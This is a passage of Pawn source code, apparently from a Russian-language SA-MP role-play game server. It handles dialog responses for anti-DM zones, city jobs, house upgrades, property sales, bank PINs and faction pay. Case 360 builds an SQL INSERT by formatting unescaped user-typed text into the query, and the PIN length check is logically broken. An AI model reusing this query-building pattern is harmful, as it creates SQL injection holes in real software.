		    new zone = GetPVarInt(playerid,"CheckAntiDM");
			new rad = strval(inputtext);
			AntiDM[zone][admRad] = rad;
			DestroyDynamicArea(AntiDM[zone][admSP]);
			AntiDM[zone][admSP] = CreateDynamicSphere(AntiDM[zone][admX],AntiDM[zone][admY],AntiDM[zone][admZ], float(AntiDM[zone][admRad]));
			query = "";
			format(query, sizeof(query), "UPDATE `antidm` SET `rad` = '%d' WHERE name = '%s' LIMIT 1",AntiDM[zone][admRad],AntiDM[zone][admName]);
			mysql_tquery(mysql,query);
			static const fmt_string32[] = "[A] %s изменил радиус Anti DM зоны %s (Радиус: %d м.)";
			new str32[sizeof(fmt_string32)+MAX_PLAYER_NAME+30];
			format(str32, sizeof(str32), fmt_string32,PlayerInfo[playerid][pSendername],AntiDM[zone][admName],rad);
			SendAdminMessage(CGREY,str32);
			SendClientMessage(playerid,CREWARD,"Вы изменили радиус антидм зоны!");
		}
		case 360:
		{
		    if(!response) return cmd_antidm(playerid);
		    new rad,name[32];
	        if(sscanf(inputtext, "p<,>s[32]d",name,rad) || rad < 0 || rad > 40000 || strlen(name) > 32) return ShowPlayerDialog(playerid,360,DIALOG_STYLE_INPUT,"Anti DM","{ffffff}Введите название и радиус через запятую:\n\nНапример: Мэрия, 30","Далее","Назад");
	        new Float:X,Float:Y,Float:Z;
			GetPlayerPos(playerid,X,Y,Z);
			new ids = -1;
			for(new i = 0; i < 100; i++)
			{
				if(AntiDM[i][admSP]) continue;
				ids = i;
				break;
			}
			AntiDM[ids][admV] = GetPlayerVirtualWorld(playerid);
			AntiDM[ids][admI] = GetPlayerInterior(playerid);
			AntiDM[ids][admX] = X;
			AntiDM[ids][admY] = Y;
			AntiDM[ids][admZ] = Z;
			AntiDM[ids][admRad] = rad;
			strmid(AntiDM[ids][admName], name, 0, strlen(name), 32);
			AntiDM[ids][admSP] = CreateDynamicSphere(X,Y,Z, float(rad));
			SendClientMessage(playerid,CREWARD,"Вы создали новую Anti DM зону! Для управления используйте: /antidm");
			query = "";
			format(query,sizeof(query),"INSERT INTO `antidm` ( `x`, `y`, `z`, `name`, `rad`, `v`, `i`) VALUES ('%f', '%f', '%f', '%s', %d, %d, %d)",
			X,Y,Z,name,rad,AntiDM[ids][admV],AntiDM[ids][admI]);
			mysql_tquery(mysql,query);
			static const fmt_string32[] = "[A] %s добавил Anti DM зону %s (Радиус: %d м.)";
			new str32[sizeof(fmt_string32)+MAX_PLAYER_NAME+30];
			format(str32, sizeof(str32), fmt_string32,PlayerInfo[playerid][pSendername],name,rad);
			SendAdminMessage(CGREY,str32);
		}
		case 361:
		{
		    if(!response) return 1;
			new text[10];
		    text = (!cheatk[listitem]) ? ("отключил") : ("включил");
		    cheatk[listitem] = (!cheatk[listitem]) ? (1) : (0);
		    static const fmt_string32[] = "[A] %s %s %s";
			new str32[sizeof(fmt_string32)+MAX_PLAYER_NAME+32+10];
			format(str32, sizeof(str32), fmt_string32,PlayerInfo[playerid][pSendername],text,NameCheat[listitem]);
			SendAdminMessage(CGREY,str32);
			SetACInt(listitem,cheatk[listitem]);
		}
		case 362:
		{
			if(!response) return RemovePlayerFromVehicle(playerid);
			ShowPlayerDialog(playerid,363,DIALOG_STYLE_LIST,"Выберите город","Los Santos\nLas Venturas","Далее","Отмена");
			
		}
		case 363:
		{
		    if(!response) return RemovePlayerFromVehicle(playerid);
		    if(PlayerInfo[playerid][pCash] < 50)
			{
			    SendClientMessage(playerid,CGREY,"Недостаточно средств");
			    RemovePlayerFromVehicle(playerid);
			    return true;
			}
   			if(GetPVarInt(playerid,"Mar") > 0) ClearJob(playerid);
			GiveMoney(playerid,-50);
			SetPVarInt(playerid,"Bus",GetPlayerVehicleID(playerid));
			SetPVarInt(playerid,"GorodCh",listitem+1);
			SetPVarInt(playerid,"Mar",6);
			RentCar[GetPlayerVehicleID(playerid)] = playerid;
			SendClientMessage(playerid,CGREEN,"Вы арендовали машину для очистки улиц. Доберитесь до места очистки");
			SendClientMessage(playerid,-1,"Для того, чтобы закончить работу используйте: {f7ae11}/end");
			UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,"Загруженно: {f7ae11}10/10 л.");
			//
			if(!listitem) SetPlayerRaceCheckpoint(playerid, 0, WashLosSantos[0][0], WashLosSantos[0][1], WashLosSantos[0][2], WashLosSantos[1][0], WashLosSantos[1][1], WashLosSantos[1][2], 5);
			else SetPlayerRaceCheckpoint(playerid, 0, WashLasVenturas[0][0], WashLasVenturas[0][1], WashLasVenturas[0][2], WashLasVenturas[1][0], WashLasVenturas[1][1], WashLasVenturas[1][2], 5);
			for(new i = 0;i< MAX_VEHICLES;i++) if(RentCar[i] == playerid && i != GetPlayerVehicleID(playerid)) SetVehicleToRespawn(i);
		}
  		case 364:
		{
		    if(!response) return true;
			ShowPlayerDialog(playerid,365,DIALOG_STYLE_LIST,"Выберите работу","Работа на машине для мойки улиц\nРабота на мусоровозе","Далее","Отмена");
		}
		case 365:
		{
		    if(!response) return true;
		    if(PlayerInfo[playerid][pJob] == listitem+6)
		    {
			    ApplyDynamicActorAnimation(WashBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				Update3DTextLabelTextEx(WashText,-1,"Вы уже работаете у нас");
				SetTimerEx("ClearBotGlobal", 3000, false, "dd", WashBot,_:WashText);
				return true;
		    }
		    PlayerInfo[playerid][pJob] = listitem+6;
      		if(GetPVarInt(playerid,"Mar") > 0) ClearJob(playerid);
		    ApplyDynamicActorAnimation(WashBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(WashText,-1,"Поздравляю вы приняты");
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", WashBot,_:WashText);
			ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"О работе","{FFFFFF}Вы были приняты на работу в бизнес\nЧтобы начать работу Вам надо сесть в машину\n\nКоманды для работы: {f7ae11}/mm » Команды » Работа","Закрыть","");
		}
		case 366:
		{
			if(!response) return RemovePlayerFromVehicle(playerid);
			ShowPlayerDialog(playerid,367,DIALOG_STYLE_LIST,"Выберите город","Los Santos\nLas Venturas","Далее","Отмена");

		}
		case 367:
		{
		    if(!response) return RemovePlayerFromVehicle(playerid);
		    if(PlayerInfo[playerid][pCash] < 50)
			{
			    SendClientMessage(playerid,CGREY,"Недостаточно средств");
			    RemovePlayerFromVehicle(playerid);
			    return true;
			}
   			if(GetPVarInt(playerid,"Mar") > 0) ClearJob(playerid);
			GiveMoney(playerid,-50);
			SetPVarInt(playerid,"Bus",GetPlayerVehicleID(playerid));
			SetPVarInt(playerid,"GorodCh",listitem+1);
			SetPVarInt(playerid,"Mar",7);
			RentCar[GetPlayerVehicleID(playerid)] = playerid;
			SendClientMessage(playerid,CGREEN,"Вы арендовали мусоровоз. Доберитесь до мусорного контейнера");
			SendClientMessage(playerid,-1,"Для того, чтобы закончить работу используйте: {f7ae11}/end");
			UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,"Загруженно: {f7ae11}0/100%");
			if(listitem == 1) SetPVarInt(playerid,"Check",144+random(177-144));
			else SetPVarInt(playerid,"Check",random(144));
		    new rand = GetMusor(playerid);
		//	if(GetPVarInt(playerid,"GorodCh") == 1) rand = random(143);
		//	else rand = random(177)+144;
			SetPVarInt(playerid,"Check",rand);
			SetPlayerRaceCheckpoint(playerid, 1, MusorPos[rand][0], MusorPos[rand][1], MusorPos[rand][2], 0.0,0.0,0.0, 8);
		//	if(!listitem) SetPlayerRaceCheckpoint(playerid, 0, WashLosSantos[0][0], WashLosSantos[0][1], WashLosSantos[0][2], WashLosSantos[1][0], WashLosSantos[1][1], WashLosSantos[1][2], 5);
		//	else SetPlayerRaceCheckpoint(playerid, 0, WashLasVenturas[0][0], WashLasVenturas[0][1], WashLasVenturas[0][2], WashLasVenturas[1][0], WashLasVenturas[1][1], WashLasVenturas[1][2], 5);
			for(new i = 0;i< MAX_VEHICLES;i++) if(RentCar[i] == playerid && i != GetPlayerVehicleID(playerid)) SetVehicleToRespawn(i);
			//ShowPlayerDialog(playerid,353,DIALOG_STYLE_INPUT,"VK Security","{FFFFFF}Введите Ваш ID в VK:\n\n","Далее","Назад");
			
		    
		}
		case 368:
		{
		    if(!response) return DeletePVar(playerid,"Etaz");
		    if(GetPVarInt(playerid,"Etaz") == listitem) return SendClientMessage(playerid,CGREY,"Вы и так на этом этаже!");
			SetCameraBehindPlayer(playerid);
			DeletePVar(playerid,"Etaz");
		    switch(listitem)
			{
				case 0:
				{
					if(PlayerInfo[playerid][pMember] == F_LSPD)
					{
					    SetPlayerPos(playerid,1564.9011,-1666.7380,28.3956);
					    SetPlayerFacingAngle(playerid,184.8149);
					    SetPlayerInterior(playerid,0);
					    SetPlayerVirtualWorld(playerid,0);
					}
					else
					{
					    SetPlayerPos(playerid,2265.5059,2458.3103,38.6837);
					    SetPlayerFacingAngle(playerid,175.7048);
					    SetPlayerInterior(playerid,0);
					    SetPlayerVirtualWorld(playerid,0);
					}
				}
				case 3:
				{
				    SetPlayerPos(playerid,1995.8892,1359.8606,1015.6134);
				    SetPlayerFacingAngle(playerid,81.8483);
				    SetPlayerVirtualWorld(playerid,(PlayerInfo[playerid][pMember] == F_LSPD) ? (17) : (1));
				    SetPlayerInterior(playerid,3);
				    FreezePlayer(playerid,1995.8892,1359.8606,0.8);
				}
				case 2:
				{
				    SetPlayerPos(playerid,1992.6161,1359.8064,2015.4706);
				    SetPlayerFacingAngle(playerid,273.2734);
				    SetPlayerVirtualWorld(playerid,(PlayerInfo[playerid][pMember] == F_LSPD) ? (17) : (1));
				    SetPlayerInterior(playerid,3);
				    FreezePlayer(playerid,1992.6161,1359.8064,0.8);
				}
				case 1:
				{
				    SetPlayerPos(playerid,2031.5718,1386.1599,3017.2234);
				    SetPlayerFacingAngle(playerid,95.2984);
				    SetPlayerVirtualWorld(playerid,(PlayerInfo[playerid][pMember] == F_LSPD) ? (17) : (1));
				    SetPlayerInterior(playerid,3);
				    FreezePlayer(playerid,2031.5718,1386.1599,0.8);
				}
				case 4:
				{
					if(PlayerInfo[playerid][pMember] == F_LSPD)
					{
					    SetPlayerPos(playerid,1568.7094,-1689.9719,6.2188);
					    SetPlayerFacingAngle(playerid,180.0);
					    SetPlayerInterior(playerid,0);
					    SetPlayerVirtualWorld(playerid,0);
					}
					else
					{
					    SetPlayerPos(playerid,2297.1116,2451.5105,10.8203);
					    SetPlayerFacingAngle(playerid,204.0019);
					    SetPlayerInterior(playerid,0);
					    SetPlayerVirtualWorld(playerid,0);
					}
				}
			}
			SetPVarInt(playerid,"FloodLift",gettime()+3);
		}
		case 369:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
			    case 0:
			    {
			        SetPlayerInterior(playerid,4);
			        SetPVarInt(playerid,"Freeze",1);
			        SetPlayerPos(playerid,2481.4058,2257.6162,991.3969);
			        SetPlayerVirtualWorld(playerid,GetPVarInt(playerid,"PBIZ"));
			    }
			    case 1:
			    {
			        SetPlayerInterior(playerid,4);
			        SetPlayerPos(playerid,1392.5464,-30.7902,1000.8685);
			        SetPlayerVirtualWorld(playerid,GetPVarInt(playerid,"PBIZ"));
			        SetPlayerInterior(playerid,BizInfo[GetPVarInt(playerid,"PBIZ")][bInt]);
			    }
			    case 2:
			    {
			        if(!GetPlayerKom(playerid)) return SendClientMessage(playerid,CGREY,"У Вас нет команты в отеле.");
	                new i = GetPVarInt(playerid,"PlayerKom");
	                if(KomInfo[i][kbiz] != GetPVarInt(playerid,"PBIZ")) return SendClientMessage(playerid,CGREY,"У Вас нет команты в данном отеле.");
					SetPlayerVirtualWorld(playerid, i);
		            SetPlayerInterior(playerid,5);
		            SetPVarInt(playerid,"Freeze",1);
		            SetPlayerPos(playerid,1281.0703,-36.1240,1000.9205);
					SetPVarInt(playerid,"PKOM",i);
			    }
		    }
		}
		case 370:
		{
		    if(!response) return cmd_house(playerid,"");
		    query = "";
			switch(listitem)
			{
				case 0:
				{
				    if(HInfo[GetPVarInt(playerid,"PlayerHouse")][hUl][0]) return SendClientMessage(playerid,CGREY,"У Вас уже куплено дайнное улучшение!");
				    format(query,sizeof(query),"{FFFFFF}Улучшение 'Гардероб'.\nВы сможете складывать вещи в гардероб.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}%d$",HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost]/100*3);
					ShowPlayerDialog(playerid,371,DIALOG_STYLE_MSGBOX,"Улучшение",query,"Далее","Назад");
				}
				case 1:
				{
				    if(HInfo[GetPVarInt(playerid,"PlayerHouse")][hUl][1]) return SendClientMessage(playerid,CGREY,"У Вас уже куплено дайнное улучшение!");
				    format(query,sizeof(query),"{FFFFFF}Улучшение 'Субсидия'.\nНалог за дом будем на 25%% меньше.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}%d$",HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost]/100*10);
					ShowPlayerDialog(playerid,371,DIALOG_STYLE_MSGBOX,"Улучшение",query,"Далее","Назад");
				}
				case 2:
				{
				    if(HInfo[GetPVarInt(playerid,"PlayerHouse")][hUl][2]) return SendClientMessage(playerid,CGREY,"У Вас уже куплено дайнное улучшение!");
				    format(query,sizeof(query),"{FFFFFF}Улучшение 'Увеличить шкаф'.\nУвеличит вместимость шкафа.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}%d$",HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost]/100*6);
					ShowPlayerDialog(playerid,371,DIALOG_STYLE_MSGBOX,"Улучшение",query,"Далее","Назад");
				}
			}
			ListNick[playerid][0] = listitem;
		}
		case 371:
		{
		    if(!response) return ShowHouseUl(playerid);
		    if(HInfo[GetPVarInt(playerid,"PlayerHouse")][hUl][ListNick[playerid][0]]) return 1;
		    switch(ListNick[playerid][0])
		    {
	   		 	case 0: if(PlayerInfo[playerid][pCash] < HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost]/100*3) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			    case 1: if(PlayerInfo[playerid][pCash] < HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost]/100*10) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			    case 2: if(PlayerInfo[playerid][pCash] < HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost]/100*6) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			}
   			switch(ListNick[playerid][0])
		    {
	   		 	case 0: GiveMoney(playerid,-HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost]/100*3);
			    case 1: GiveMoney(playerid,-HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost]/100*10);
			    case 2: GiveMoney(playerid,-HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost]/100*6);
			}
			HInfo[GetPVarInt(playerid,"PlayerHouse")][hUl][ListNick[playerid][0]] = 1;
			switch(ListNick[playerid][0])
		    {
	   		 	case 0:
				{
					new idx = GetPVarInt(playerid,"PlayerHouse");
			//	    HInfo[idx][hGarPic] = CreateDynamicPickup(19902,23,HInfo[idx][hGar][0],HInfo[idx][hGar][1],HInfo[idx][hGar][2],HInfo[idx][hVirt],HInfo[idx][hInt]);
			    //	HInfo[idx][hGarText] = CreateDynamic3DTextLabel("", -1,HInfo[idx][hGar][0],HInfo[idx][hGar][1],HInfo[idx][hGar][2]+1.5,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0, HInfo[idx][hVirt]);
					SetHouseInt(GetPVarInt(playerid,"PlayerHouse"),"ul1",1);
					UpdateDynamic3DTextLabelText(HInfo[idx][hGarText] , -1, "{f7ae11}[Гардероб]{ffffff}\nИспользуйте: {f7ae11}LALT");
					
				}
			    case 1: SetHouseInt(GetPVarInt(playerid,"PlayerHouse"),"ul2",1);
			    case 2: SetHouseInt(GetPVarInt(playerid,"PlayerHouse"),"ul3",1);
			}
			SendClientMessage(playerid,CREWARD,"[HOUSE]{FFFFFF} Вы приобрели улучшение");
		}
		case 372:
		{
		    if(!response) return DeletePVar(playerid,"Obm");
		    new cena,name;
	        if(sscanf(inputtext, "p<,>ud",name,cena) || cena < 1 || !IsPlayerConnected(name) || PlayerLogged[name] == false)
	        {
	            switch(GetPVarInt(playerid,"Obm"))
	            {
	            	case 0: ShowPlayerDialog(playerid,372,DIALOG_STYLE_INPUT,"Продать дом игроку","{ffffff}Введите ID игрока и цену через запятую!\n\nНапример: 53,100000","Далее","Отмена");
					case 1: ShowPlayerDialog(playerid,372,DIALOG_STYLE_INPUT,"Обменяться домами с игроком","{ffffff}Введите ID игрока и доплату через запятую!\n\nНапример: 53,100000","Далее","Отмена");
                    case 2: ShowPlayerDialog(playerid,372,DIALOG_STYLE_INPUT,"Продать бизнес игроку","{ffffff}Введите ID игрока и цену через запятую!\n\nНапример: 53,100000","Далее","Отмена");
					case 3: ShowPlayerDialog(playerid,372,DIALOG_STYLE_INPUT,"Обменяться бизнесами с игроком","{ffffff}Введите ID игрока и доплату через запятую!\n\nНапример: 53,100000","Далее","Отмена");
                	case 4: ShowPlayerDialog(playerid,372,DIALOG_STYLE_INPUT,"Продать транспорт игроку","{ffffff}Введите ID игрока и цену через запятую!\n\nНапример: 53,100000","Далее","Отмена");
					case 5: ShowPlayerDialog(playerid,372,DIALOG_STYLE_INPUT,"Обменяться транспортом с игроком","{ffffff}Введите ID игрока и доплату через запятую!\n\nНапример: 53,100000","Далее","Отмена");
				}
				return 1;
			}
			new str[30];
			format(str,sizeof(str),"%d %d",name,cena);
			switch(GetPVarInt(playerid,"Obm"))
			{
			    case 0: cmd_sellhouse(playerid,str);
			    case 1: cmd_changehouse(playerid,str);
			    case 2: cmd_sellbiz(playerid,str);
			    case 3: cmd_changebiz(playerid,str);
			    case 4:
				{
				    if(GetPlayerVehicleID(playerid) != VInfo[GetPVarInt(playerid,"MyCar")][vcar]) return SendClientMessage(playerid,CGREY,"Вы не в своём транспортом средстве");
                    cmd_sellcar(playerid,str);
				}
				case 5:
				{
				    if(GetPlayerVehicleID(playerid) != VInfo[GetPVarInt(playerid,"MyCar")][vcar]) return SendClientMessage(playerid,CGREY,"Вы не в своём транспортом средстве");
                    cmd_changecar(playerid,str);
				}
			}
			DeletePVar(playerid,"Obm");
		    
		}
		

		case 373:
		{
		    if(!response) return DeletePVar(playerid,"Banks");
		    if(!strval(inputtext) ||  4 < strlen(inputtext) < 4) return ShowPlayerDialog(playerid,373,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
			if(strval(inputtext) != PlayerInfo[playerid][pBankPin])
			{
			    SendClientMessage(playerid,CGREY,"Неверный PIN-CODE!");
                return ShowPlayerDialog(playerid,373,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
			}
			if(GetPVarInt(playerid,"Banks"))
			{
			    query = "";
			    format(query,sizeof(query),"{FFFFFF}1 | Банковские счета\n2 | Перевести на другой счет\n3 | Пополнить счет\n4 | Снять с баланса бизнеса\n5 | Пополнить баланс бизнеса\n6 | Оплатить бизнес\n7 | Оплатить дом\n8 | Оплатить налог на транспорт\n9 | Изменить PIN-CODE");
				//new str[sizeof(fmt_string)+50];
				if(PlayerInfo[playerid][pFam] > 0)
				{
				    strcat(query,"\n10 | Пополнить общак семьи");
				    if(strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], PlayerInfo[playerid][pSendername], true) == 0) strcat(query,"\n11 | Снять с общака семьи");
				}
				ShowPlayerDialog(playerid,164,DIALOG_STYLE_LIST,"Банк",query,"Далее","Назад");
				DeletePVar(playerid,"Banks");
			}
			else Bankomat(playerid);
		}
		
		case 374:
		{
		    if(!response) return 1;
		    if(!strval(inputtext) ||  4 < strlen(inputtext) < 4) return ShowPlayerDialog(playerid,374,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Придумайте 4-ех значный PIN-CODE:\n\n","Далее","Отмена");
			PlayerInfo[playerid][pBankPin] = strval(inputtext);
            static const fmt_string[] = "[BANK]{FFFFFF} Ваш PIN-CODE от карты: %d";
			new str[sizeof(fmt_string)+4];
			format(str, sizeof(str), fmt_string,strval(inputtext));
			SendClientMessage(playerid,CREWARD,str);
			CheckQuest(playerid,0);
		}
		case 375:
		{
			if(!response) return 1;
			if(GetPVarInt(playerid,"Mar") > 0 && GetPVarInt(playerid,"Mar") < 4 || GetPVarInt(playerid,"Mar") == 6 || GetPVarInt(playerid,"InDrift")) return SendClientMessage(playerid,CGREY,"Нельзя использовать GPS на работе");
			if(GetPVarInt(playerid,"GPS") > 0) DisablePlayerRaceCheckpoint(playerid),DeletePVar(playerid,"GPS");
			new i = ListNick[playerid][listitem];
			new Float: fDistance = GetPlayerDistanceFromPoint(playerid, FracInfo[i][fNaborPos][0],FracInfo[i][fNaborPos][1],FracInfo[i][fNaborPos][2]);
            SetPlayerRaceCheckpoint(playerid,2,FracInfo[i][fNaborPos][0],FracInfo[i][fNaborPos][1],FracInfo[i][fNaborPos][2],0,0,0,10);
            static const fmt_string1[] = "[GPS]{ffffff} До точки назначения 'Набор в %s' осталось %.1f м.";
			new str1[sizeof(fmt_string1)+40];
			format(str1, sizeof(str1), fmt_string1,FracInfo[i][fName],fDistance);
			SendClientMessage(playerid,CREWARD,str1);
            SetPVarInt(playerid,"GPS",1);
			
		}
		case 376:
		{
		    if(!response) return cmd_lpanel(playerid);
			new str[20];
            switch(listitem)
            {
                case 0: SetPVarInt(playerid,"Member",1),str = "Лицензия класса 'C'";
                case 1: SetPVarInt(playerid,"Member",2),str = "Лицензия класса 'M'";
                case 2: SetPVarInt(playerid,"Member",3),str = "Лицензия класса 'B'";
                case 3: SetPVarInt(playerid,"Member",4),str = "Лицензия класса 'P'";
                case 4: SetPVarInt(playerid,"Member",5),str = "Лицензия класса 'W'";
            }
            ShowPlayerDialog(playerid,377,DIALOG_STYLE_INPUT,str,"{FFFFFF}Введите цену за данную лицензию:\nОт 1000$ до 15000$","Далее","Назад");
		}
		case 377:
		{
		    if(!response) return DeletePVar(playerid,"Member");
		    new nick;
		    if(sscanf(inputtext,"i",nick)) return ShowPlayerDialog(playerid,377,DIALOG_STYLE_INPUT,"Изменение цены","{FFFFFF}Введите цену за данную лицензию:\nОт 1000$ до 5000$","Далее","Назад");
		    if(nick < 1000 || nick > 15000) return ShowPlayerDialog(playerid,377,DIALOG_STYLE_INPUT,"Изменение цены","{FFFFFF}Введите цену за данную лицензию:\nОт 1000$ до 15000$","Далее","Назад");
			LicCost[GetPVarInt(playerid,"Member")-1] = nick;
			new str[10];
			format(str,sizeof(str),"liccost%i",GetPVarInt(playerid,"Member"));
			SetMatsInt(str,nick);
			new text[2];
			switch(GetPVarInt(playerid,"Member"))
            {
                case 0: text = "C";
                case 1: text = "M";
                case 2: text = "B";
                case 3: text = "P";
                case 4: text = "W";
            }
			static const fmt_string2[] = "Новая цена на лицензию класса '%s' составляет %d$";
			new str2[sizeof(fmt_string2)+10];
			format(str2, sizeof(str2), fmt_string2,text,nick);
			SendGov(playerid,str2);
		}
		case 378:
		{
		    if(!response) return cmd_lpanel(playerid);
            switch(listitem)
            {
                case 0: SetPVarInt(playerid,"Member",F_LVPD);
                case 1: SetPVarInt(playerid,"Member",F_ARMY);
                case 2: SetPVarInt(playerid,"Member",F_HOSPITAL_LS);
                case 3: SetPVarInt(playerid,"Member",F_NEWS);
                case 4: SetPVarInt(playerid,"Member",F_MAYOR);
                case 5: SetPVarInt(playerid,"Member",F_LIC);
            }
            ShowPlayerDialog(playerid,379,DIALOG_STYLE_INPUT,FracInfo[GetPVarInt(playerid,"Member")][fName],"{FFFFFF}Введите процент бонуса к зарплате организации:\n\n","Далее","Отмена");
		}
		case 379:
		{
		    if(!response) return DeletePVar(playerid,"Member");
		    new nick;
			new text[30];
		    if(sscanf(inputtext,"i",nick) || nick < 0) return ShowPlayerDialog(playerid,379,DIALOG_STYLE_INPUT,FracInfo[GetPVarInt(playerid,"Member")][fName],"{FFFFFF}Введите процент бонуса к зарплате организации:\n\n","Далее","Отмена");
			switch(GetPVarInt(playerid,"Member"))
			{
			    case F_LVPD:
			    {
			        if(nick > 20) return ShowPlayerDialog(playerid,379,DIALOG_STYLE_INPUT,FracInfo[GetPVarInt(playerid,"Member")][fName],"{FFFFFF}Введите процент бонуса к зарплате организации:\n\n","Далее","Отмена");
			        FracInfo[F_LSPD][fPayDay] = nick;
					SetFractionInt(F_LSPD,"payday1",nick);
					FracInfo[F_LVPD][fPayDay] = nick;
					SetFractionInt(F_LVPD,"payday1",nick);
					FracInfo[F_FBI][fPayDay] = nick;
					SetFractionInt(F_FBI,"payday1",nick);
					text = "правоохранительных органов";
			    }
			    case F_ARMY:
			    {
			        if(nick > 50) return ShowPlayerDialog(playerid,379,DIALOG_STYLE_INPUT,FracInfo[GetPVarInt(playerid,"Member")][fName],"{FFFFFF}Введите процент бонуса к зарплате организации:\n\n","Далее","Отмена");
			        FracInfo[F_ARMY][fPayDay] = nick;
					SetFractionInt(F_ARMY,"payday1",nick);
					text = "армии";
			    }
			    case F_HOSPITAL_LS:
			    {
			        if(nick > 50) return ShowPlayerDialog(playerid,379,DIALOG_STYLE_INPUT,FracInfo[GetPVarInt(playerid,"Member")][fName],"{FFFFFF}Введите процент бонуса к зарплате организации:\n\n","Далее","Отмена");
			        FracInfo[F_HOSPITAL_LS][fPayDay] = nick;
					SetFractionInt(F_HOSPITAL_LS,"payday1",nick);
					text = "организаций здавоохранения";
			    }
			    case F_NEWS:
			    {
			        if(nick > 10) return ShowPlayerDialog(playerid,379,DIALOG_STYLE_INPUT,FracInfo[GetPVarInt(playerid,"Member")][fName],"{FFFFFF}Введите процент бонуса к зарплате организации:\n\n","Далее","Отмена");
			        FracInfo[F_NEWS][fPayDay] = nick;
					SetFractionInt(F_NEWS,"payday1",nick);
					text = "новостей";
			    }
			    case F_MAYOR:
			    {
			        if(nick > 10) return ShowPlayerDialog(playerid,379,DIALOG_STYLE_INPUT,FracInfo[GetPVarInt(playerid,"Member")][fName],"{FFFFFF}Введите процент бонуса к зарплате организации:\n\n","Далее","Отмена");
			        FracInfo[F_MAYOR][fPayDay] = nick;
					SetFractionInt(F_MAYOR,"payday1",nick);
					text = "правительства";
			    }
			    case F_LIC:
			    {
			        if(nick > 10) return ShowPlayerDialog(playerid,379,DIALOG_STYLE_INPUT,FracInfo[GetPVarInt(playerid,"Member")][fName],"{FFFFFF}Введите процент бонуса к зарплате организации:\n\n","Далее","Отмена");
			        FracInfo[F_LIC][fPayDay] = nick;
					SetFractionInt(F_LIC,"payday1",nick);
					text = "автошколы";
			    }
			}

			static const fmt_string2[] = "Новая надбавка к зарплате у %s составляет %d%s";
			new str2[sizeof(fmt_string2)+30+3];
			format(str2, sizeof(str2), fmt_string2,text,nick,"%");
			SendGov(playerid,str2);
            DeletePVar(playerid,"Member");
		}
		case 380:
		{
		    if(!response) return DeletePVar(playerid,"Member");
		    switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid,381,DIALOG_STYLE_INPUT,"Перевод денежных средств","{FFFFFF}Введите процент к переводу денежных средств:\n\n","Далее","Отмена");
				case 1: ShowPlayerDialog(playerid,382,DIALOG_STYLE_INPUT,"Биржа","{FFFFFF}Введите процент к услугам биржи:\n\n","Далее","Отмена");
				case 2: ShowPlayerDialog(playerid,426,DIALOG_STYLE_INPUT,"Услуги адвоката","{FFFFFF}Введите процент к услугам адвоката:\n\n","Далее","Отмена");
			}
		}
		
	
		case 381:
		{
		    if(!response) return DeletePVar(playerid,"Member");
		    if(!strlen(inputtext) || strval(inputtext) < 0 || strval(inputtext) > 3) return ShowPlayerDialog(playerid,381,DIALOG_STYLE_INPUT,"Перевод денежных средств","{FFFFFF}Введите процент к переводу денежных средств:\n\n","Далее","Отмена");
		    Perevod = strval(inputtext);
			SetMatsInt("Perevod",strval(inputtext));
			static const fmt_string2[] = "Цена за услугу перевода стредств теперь составляет %d%% от общей суммы";
			new str2[sizeof(fmt_string2)+3];
			format(str2, sizeof(str2), fmt_string2,strval(inputtext));
			SendGov(playerid,str2);
		}
		case 382:
		{
		    if(!response) return DeletePVar(playerid,"Member");
		    if(!strlen(inputtext) || strval(inputtext) < 0 || strval(inputtext) > 20) return ShowPlayerDialog(playerid,382,DIALOG_STYLE_INPUT,"Биржа","{FFFFFF}Введите процент к услугам биржи:\n\n","Далее","Отмена");
		    Birga = strval(inputtext);
			SetMatsInt("Birga",strval(inputtext));
			static const fmt_string2[] = "Цена за услуги биржи теперь составляет %d%% от суммы сделки";
			new str2[sizeof(fmt_string2)+3];
			format(str2, sizeof(str2), fmt_string2,strval(inputtext));
			SendGov(playerid,str2);
		}
		case 383:
		{
		    if(!response)
			{
				if(IsAGang(playerid) || IsAMafia(playerid)) ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
				return true;
			}
            switch(listitem)
		    {
		        case 0: ShowPlayerDialog(playerid,39,DIALOG_STYLE_INPUT,"Взять","{FFFFFF}Введите сколько материалов хотите взять:","Далее","Назад");
		        case 1: ShowPlayerDialog(playerid,40,DIALOG_STYLE_INPUT,"Взять","{FFFFFF}Введите сколько наркотиков хотите взять:","Далее","Назад");
		    }
		}
		case 384:
		{
		    if(!response)
			{
				if(IsAGang(playerid) || IsAMafia(playerid)) ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
				return true;
			}
            switch(listitem)
		    {
		        case 0: ShowPlayerDialog(playerid,41,DIALOG_STYLE_INPUT,"Положить","{FFFFFF}Введите сколько материалов хотите положить:","Далее","Назад");
